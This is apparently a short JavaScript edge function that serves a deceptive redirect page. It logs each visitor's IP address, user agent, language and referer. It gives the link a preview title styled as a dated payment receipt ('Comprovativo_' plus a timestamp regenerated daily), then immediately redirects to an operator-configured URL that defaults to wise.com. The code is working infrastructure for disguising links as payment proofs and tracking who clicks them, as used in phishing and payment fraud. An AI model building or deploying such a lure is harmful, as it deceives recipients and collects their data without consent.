export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);

  const REDIRECT_URL = env.REDIRECT_URL || "https://wise.com/";

  const ip = request.headers.get("CF-Connecting-IP") || "unknown";
  const ua = request.headers.get("User-Agent") || "";
  const lang = request.headers.get("Accept-Language") || "";
  const referer = request.headers.get("Referer") || "";
  const now = new Date();
  const ts = now.toISOString();

  console.log(JSON.stringify({
    ts, ip, ua: ua.substring(0, 80), lang, referer,
    method: request.method, path: url.pathname
  }));

  // --- daily OG auto-update (WAT / UTC+1) ---
  const wat = new Date(now.getTime() + 1 * 60 * 60 * 1000);
  const dateKey = wat.toISOString().split("T")[0];

  const dd = wat.getUTCDate().toString().padStart(2, "0");
  const mm = (wat.getUTCMonth() + 1).toString().padStart(2, "0");
  const yyyy = wat.getUTCFullYear();
  const hh = wat.getUTCHours().toString().padStart(2, "0");
  const min = wat.getUTCMinutes().toString().padStart(2, "0");

  let ogTimestamp;

  if (env.OG_STATE) {
    try {
      ogTimestamp = await env.OG_STATE.get(dateKey);
    } catch (e) {}

    if (!ogTimestamp) {
      ogTimestamp = `${dd}${mm}${yyyy}${hh}${min}`;
      try {
        await env.OG_STATE.put(dateKey, ogTimestamp, { expirationTtl: 172800 });
        console.log(JSON.stringify({
          event: "OG_DAILY_UPDATE",
          date: dateKey,
          new_og: `Comprovativo_${ogTimestamp}`,
          generated_at: ts
        }));
      } catch (e) {}
    }
  } else {
    ogTimestamp = `${dd}${mm}${yyyy}${hh}${min}`;
  }

  const ogTitle = `Comprovativo_${ogTimestamp}`;

  const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta property="og:title" content="${ogTitle}">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="${ogTitle}">
<title>${ogTitle}</title>
<meta http-equiv="refresh" content="0;url=${REDIRECT_URL}">
</head>
<body>
<script>window.location.replace("${REDIRECT_URL}");</script>
</body>
</html>`;

  return new Response(html, {
    headers: { "Content-Type": "text/html;charset=UTF-8" }
  });
}
